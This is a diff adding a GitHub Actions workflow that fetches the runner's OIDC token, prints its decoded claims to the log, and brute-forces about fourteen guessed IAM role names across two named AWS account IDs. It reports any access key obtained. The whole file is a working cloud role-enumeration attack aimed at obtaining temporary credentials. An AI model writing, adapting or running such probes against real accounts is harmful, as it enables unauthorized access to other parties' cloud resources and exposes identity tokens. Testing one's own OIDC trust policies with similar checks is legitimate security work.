@@ -1,0 +1,24 @@
+name: OIDC claims probe
+on:
+  workflow_dispatch:
+
+permissions:
+  contents: read
+  id-token: write
+
+jobs:
+  claims:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Dump OIDC claims and try candidate roles
+        run: |
+          set +e
+          TOK=$(curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=sts.amazonaws.com" | python3 -c 'import sys,json;print(json.load(sys.stdin)["value"])')
+          echo "== JWT payload =="
+          echo "$TOK" | cut -d. -f2 | tr '_-' '/+' | base64 -d 2>/dev/null; echo; echo
+          for R in GitHubActions-CxPortalDocsPreview GitHubActions-CxPortalDocs GitHubActions-CxPortalDocsProd GitHubActions-CxPortalDocsProduction GitHubActions-DocsPreview GitHubActions-DocsDeploy GitHubActions-OIDC GitHubActions-Terraform GitHubActions github-actions GitHubActionsRole caylent-readonly caylent-working caylent-kernel trek10-readonly; do
+            for ACCT in 228731404939 567716009496; do
+              OUT=$(aws sts assume-role-with-web-identity --role-arn "arn:aws:iam::$ACCT:role/$R" --role-session-name oidcprobe --web-identity-token "$TOK" --duration-seconds 900 --query 'Credentials.AccessKeyId' --output text 2>&1 | tail -1)
+              echo "TRY $ACCT/$R => $OUT"
+            done
+          done
